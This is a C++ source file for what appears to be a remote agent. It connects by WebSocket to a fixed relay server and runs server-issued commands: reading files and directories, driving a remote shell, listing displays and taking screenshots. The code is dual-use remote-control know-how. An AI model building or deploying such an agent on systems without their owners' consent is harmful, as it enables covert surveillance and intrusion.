#include "commands.h"
#include "runtime.h"
#include "websocket_client.h"
#include "shell.h"

static const CHAR *CommandTypeName(UINT8 type)
{
    switch (type)
    {
    case CommandType::Command_GetSystemInfo:
        return "GetSystemInfo";
    case CommandType::Command_GetDirectoryContent:
        return "GetDirectoryContent";
    case CommandType::Command_GetFileContent:
        return "GetFileContent";
    case CommandType::Command_GetFileChunkHash:
        return "GetFileChunkHash";
    case CommandType::Command_WriteShell:
        return "WriteShell";
    case CommandType::Command_ReadShell:
        return "ReadShell";
    case CommandType::Command_GetDisplays:
        return "GetDisplays";
    case CommandType::Command_GetScreenshot:
        return "GetScreenshot";
    case CommandType::Command_ResetShell:
        return "ResetShell";
    default:
        return "Unknown";
    }
}

#ifndef AGENT_RELAY_URL
#define AGENT_RELAY_URL "https://relay.nostdlib.workers.dev/agent"
#endif

// Deploy token minted per-build (../scripts/auth/mint-deploy-token.mjs, signed by the
// operator key) and baked in via CMake (AGENT_DEPLOY_TOKEN). Sent on every /agent
// connect as the X-Deploy-Token header so the relay authenticates the upgrade. An
// empty default compiles but the relay will reject the enrollment attempt — deploy.sh
// and docker-build.sh fail fast before that happens, so this is just a build fallback.
#ifndef AGENT_DEPLOY_TOKEN
#define AGENT_DEPLOY_TOKEN ""
#endif

INT32 start()
{
    const CHAR url[] = AGENT_RELAY_URL;
    const CHAR deployToken[] = AGENT_DEPLOY_TOKEN;

    Context context;
    UINT32 connectionAttempt = 0;

    CommandHandler commandHandlers[CommandType::CommandTypeCount] = {nullptr};
    commandHandlers[CommandType::Command_GetSystemInfo] = Handle_GetSystemInfoCommand;
    commandHandlers[CommandType::Command_GetDirectoryContent] = Handle_GetDirectoryContentCommand;
    commandHandlers[CommandType::Command_GetFileContent] = Handle_GetFileContentCommand;
    commandHandlers[CommandType::Command_GetFileChunkHash] = Handle_GetFileChunkHashCommand;
    commandHandlers[CommandType::Command_WriteShell] = Handle_WriteShellCommand;
    commandHandlers[CommandType::Command_ReadShell] = Handle_ReadShellCommand;
    commandHandlers[CommandType::Command_GetDisplays] = Handle_GetDisplaysCommand;
    commandHandlers[CommandType::Command_GetScreenshot] = Handle_GetScreenshotCommand;
    commandHandlers[CommandType::Command_ResetShell] = Handle_ResetShellCommand;

    LOG_INFO("Agent starting, registered %d command handlers", (INT32)CommandType::CommandTypeCount);

    while (1)
    {
        connectionAttempt++;
#ifdef AGENT_VERBOSE_LOG
        LOG_INFO("Connection attempt #%u to %s", connectionAttempt, (PCCHAR)url);
#else
        LOG_INFO("Connection attempt #%u", connectionAttempt);
#endif

        auto createResult = WebSocketClient::Create(url, deployToken);
        if (!createResult)
        {
#ifdef AGENT_VERBOSE_LOG
            LOG_ERROR("Connection attempt #%u failed: unable to open WebSocket to %s", connectionAttempt, (PCCHAR)url);
#else
            LOG_ERROR("Connection attempt #%u failed: unable to open WebSocket", connectionAttempt);
#endif
            return 0;
        }
        WebSocketClient &wsClient = createResult.Value();
#ifdef AGENT_VERBOSE_LOG
        LOG_INFO("WebSocket connection established (attempt #%u) to %s", connectionAttempt, (PCCHAR)url);
#else
        LOG_INFO("WebSocket connection established (attempt #%u)", connectionAttempt);
#endif

        UINT32 messageCount = 0;
        while (1)
        {
            LOG_DEBUG("Waiting for next WebSocket message...");
            auto readResult = wsClient.Read();
            if (!readResult)
            {
                LOG_ERROR("WebSocket read failed after %u messages processed, reconnecting...", messageCount);
                break;
            }

            messageCount++;

            // Guard against zero-length / too-short frames: a 0-byte WS message has
            // Data==nullptr, so command[0] would null-deref and commandLength would
            // underflow to SIZE_MAX. Skip frames too small to carry a command byte.
            if (readResult.Value().Length < sizeof(UINT8))
            {
                LOG_WARNING("Received a %u-byte frame; too small for a command byte — skipping",
                            (UINT32)readResult.Value().Length);
                continue;
            }

            PCHAR command = (PCHAR)(readResult.Value().Data);
            UINT8 commandType = command[0];
            command++;
            USIZE commandLength = readResult.Value().Length - sizeof(UINT8);
            LOG_INFO("Message #%u received: command=%s (0x%02x), payload_length=%u, ws_opcode=%d",
                     messageCount, CommandTypeName(commandType), (UINT32)commandType,
                     (UINT32)commandLength, (INT32)readResult.Value().Opcode);

            PCHAR response = nullptr;
            USIZE responseLength = sizeof(UINT32);

            if (commandType < CommandType::CommandTypeCount && commandHandlers[commandType])
            {
                LOG_DEBUG("Dispatching command %s to handler", CommandTypeName(commandType));
                commandHandlers[commandType](command, commandLength, &response, &responseLength, &context);
                if (response == nullptr)
                {
                    LOG_ERROR("Command %s handler returned no response (out of memory)", CommandTypeName(commandType));
                    continue;
                }
                UINT32 statusCode = *(PUINT32)response;
                LOG_INFO("Command %s completed: status=%u, response_length=%u",
                         CommandTypeName(commandType), statusCode, (UINT32)responseLength);
            }
            else
            {
                LOG_ERROR("Unknown command type 0x%02x received (max valid: 0x%02x), returning StatusUnknownCommand",
                          (UINT32)commandType, (UINT32)(CommandType::CommandTypeCount - 1));
                response = new CHAR[responseLength];
                if (response == nullptr)
                {
                    LOG_ERROR("Out of memory building unknown-command response");
                    continue;
                }
                *(PUINT32)response = StatusCode::StatusUnknownCommand;
            }

            LOG_DEBUG("Sending response (%u bytes) to server", (UINT32)responseLength);
            auto writeResult = wsClient.Write(Span<const CHAR>(response, responseLength), WebSocketOpcode::Binary);
            delete[] response;

            if (!writeResult)
            {
                LOG_ERROR("Failed to send response for command %s, reconnecting...", CommandTypeName(commandType));
                break;
            }
            LOG_INFO("Response sent successfully for command %s (%u bytes)", CommandTypeName(commandType), (UINT32)responseLength);
        }

        LOG_WARNING("WebSocket session ended after %u messages, will attempt reconnection", messageCount);
    }
    return 1;
}
